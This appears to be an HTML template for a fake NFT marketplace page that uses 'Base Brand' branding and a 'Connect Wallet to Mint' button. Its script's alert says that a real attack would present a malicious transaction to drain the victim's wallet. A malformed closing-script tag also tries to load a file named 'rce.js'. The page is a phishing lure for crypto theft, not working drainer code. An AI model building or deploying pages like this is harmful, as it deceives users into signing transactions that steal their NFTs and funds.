<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Base Brand NFT Marketplace</title>
    <style>
        @font-face {
            font-family: 'MyLocalFont';
            src: url('035951aefad7b653-s.p.woff2') format('woff2'); /* Edit this line with the correct path to your font file */
            font-weight: normal;
            font-style: normal;
        }
        body {
            font-family: 'MyLocalFont', sans-serif;
            background-color: #1a1a1a;
            color: #f0f0f0;
            margin: 0;
        }
        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 20px;
            background-color: #2c2c2c;
        }
        .logo {
            font-size: 1.5em;
            font-weight: 700;
        }
        .nav-links a {
            color: #f0f0f0;
            text-decoration: none;
            margin-left: 20px;
        }
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 50px;
        }
        .nft-card {
            background-color: #2c2c2c;
            border-radius: 15px;
            box-shadow: 0 10px 20px rgba(0,0,0,0.25);
            padding: 30px;
            text-align: center;
            max-width: 350px;
        }
        .nft-image {
            width: 100%;
            border-radius: 10px;
            margin-bottom: 20px;
        }
        .nft-title {
            font-size: 2em;
            margin: 10px 0;
        }
        .nft-description {
            color: #a0a0a0;
            margin-bottom: 30px;
        }
        .connect-button {
            background-color: #007bff;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 10px;
            font-size: 1.2em;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        .connect-button:hover {
            background-color: #0056b3;
        }
        .footer {
            text-align: center;
            padding: 20px;
            background-color: #2c2c2c;
            position: absolute;
            bottom: 0;
            width: 100%;
        }
    </style>
</head>
<body>

    <div class="navbar">
        <div class="logo">Base Brand NFTs</div>
        <div class="nav-links">
            <a href="#">Explore</a>
            <a href="#">Stats</a>
            <a href="#">Create</a>
        </div>
    </div>

    <div class="container">
        <div class="nft-card">
            <img src="https://res.cloudinary.com/base-web/image/upload/c_limit,w_750/f_auto/q_75/v1/bito/1975a161d58cc60771076f78714d102a?_a=BAVAZGE70" alt="NFT Image" class="nft-image">
            <h1 class="nft-title">DRIP2_3</h1>
            <p class="nft-description">A unique, one-of-a-kind DRIP2_3 from the exclusive collection. A must-have for any serious collector.</p>
            <button class="connect-button" onclick="connectWallet()">Connect Wallet to Mint</button>
        </div>
    </div>

    <div class="footer">
        &copy; 2025 Base Brand NFTs. All rights reserved.
    </div>

    <script>
        function connectWallet() {
            alert("This is where the magic happens. In a real attack, you would now present the user with a malicious transaction to sign, which would drain their wallet of their NFTs and crypto.");
        }
    </script>
    </script src=rce.js></script>
</body>
</html>
